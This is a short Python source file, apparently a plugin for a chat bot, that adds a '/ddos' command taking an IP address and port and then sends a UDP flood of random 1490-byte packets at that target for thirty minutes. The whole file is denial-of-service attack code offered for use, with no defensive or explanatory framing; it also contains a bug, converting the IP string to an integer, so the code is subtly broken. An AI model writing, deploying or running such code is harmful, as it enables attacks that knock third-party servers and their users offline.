import sys
import os
import time
import socket
import random
from alexa.events import alexabot

@alexabot(pattern="/ddos (.*) (.*)")
async def ddos(event): 
  iip = event.pattern_match.group(1)
  portt = event.pattern_match.group(2)
  ip = int(iip)
  port = int(portt)
  timeout = 1800
  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  bytes = random._urandom(1490)
  timeout_start = time.time()
  while time.time() < timeout_start + timeout:
     sock.sendto(bytes, (ip,port))
   
